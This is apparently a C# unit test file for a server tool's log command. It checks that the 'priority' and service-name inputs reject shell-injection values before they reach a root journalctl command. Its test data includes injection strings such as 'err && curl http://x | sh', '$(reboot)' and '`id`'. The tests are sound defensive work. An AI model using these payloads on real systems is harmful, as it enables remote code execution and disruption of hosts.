using Microsoft.AspNetCore.Http;
using Whiskers.Mcp.Tools;
using Whiskers.Services.Server;

namespace Whiskers.Tests;

/// <summary>A2.10: <c>get_server_logs</c> is Read-level, and its <c>priority</c> went unchecked into a journalctl
/// line that runs as root on the host. Any read key could run any command on any server.</summary>
public class ServerLogsToolInjectionTests
{
    [Theory]
    [InlineData("err; id")]
    [InlineData("err && curl http://x | sh")]
    [InlineData("$(reboot)")]
    [InlineData("`id`")]
    [InlineData("err\n")]          // "$" in .NET matches before a trailing newline; the newline would end the command
    [InlineData("err\nid")]
    [InlineData("8")]
    [InlineData("warn")]
    [InlineData("err..")]
    [InlineData("-p")]
    public async Task A_priority_outside_journalctls_vocabulary_never_reaches_the_host(string priority)
    {
        var exec = new RecordingExecutor();
        var result = await MonitoringTools.GetServerLogs(Caller(), null!, exec, "badwolf", priority: priority);

        Assert.StartsWith("Error: Invalid priority", result);
        Assert.Empty(exec.Commands);
    }

    [Theory]
    [InlineData("nginx\n")]
    [InlineData("nginx;id")]
    public async Task A_service_name_with_shell_characters_never_reaches_the_host(string serviceName)
    {
        var exec = new RecordingExecutor();
        var result = await MonitoringTools.GetServerLogs(Caller(), null!, exec, "badwolf", serviceName: serviceName);

        Assert.StartsWith("Error: Invalid service name", result);
        Assert.Empty(exec.Commands);
    }

    [Theory]
    [InlineData("err", "journalctl --no-pager -u nginx -p err -n 50")]
    [InlineData("3", "journalctl --no-pager -u nginx -p 3 -n 50")]
    [InlineData("err..warning", "journalctl --no-pager -u nginx -p err..warning -n 50")]
    public async Task Valid_priorities_still_work(string priority, string expected)
    {
        var exec = new RecordingExecutor();
        await MonitoringTools.GetServerLogs(Caller(), null!, exec, "badwolf", serviceName: "nginx", lines: 50, priority: priority);

        Assert.Equal(expected, Assert.Single(exec.Commands));
    }

    [Fact]
    public void The_builder_refuses_an_unchecked_value_instead_of_building_the_line()
    {
        Assert.Throws<ArgumentException>(() => MonitoringTools.BuildJournalctlCommand(null, 10, "err; id"));
        Assert.Throws<ArgumentException>(() => MonitoringTools.BuildJournalctlCommand("a b", 10, null));
        Assert.Equal("journalctl --no-pager -n 1000", MonitoringTools.BuildJournalctlCommand(null, 5000, null));
    }

    /// <summary>AUTH_DISABLED cookie caller (maps to admin) — only gets past the permission gate.</summary>
    private static IHttpContextAccessor Caller() => new HttpContextAccessor
    {
        HttpContext = new DefaultHttpContext
        {
            User = new System.Security.Claims.ClaimsPrincipal(new System.Security.Claims.ClaimsIdentity(
                Array.Empty<System.Security.Claims.Claim>(), Whiskers.Services.Auth.AuthConstants.AuthDisabledScheme))
        }
    };

    private sealed class RecordingExecutor : IHostCommandExecutor
    {
        public List<string> Commands { get; } = new();

        public Task<CommandResult> ExecuteAsync(string serverId, string command, TimeSpan? timeout = null,
            CancellationToken ct = default, int? maxOutputChars = null)
        {
            Commands.Add(command);
            return Task.FromResult(new CommandResult { ExitCode = 0, Output = "" });
        }
    }
}
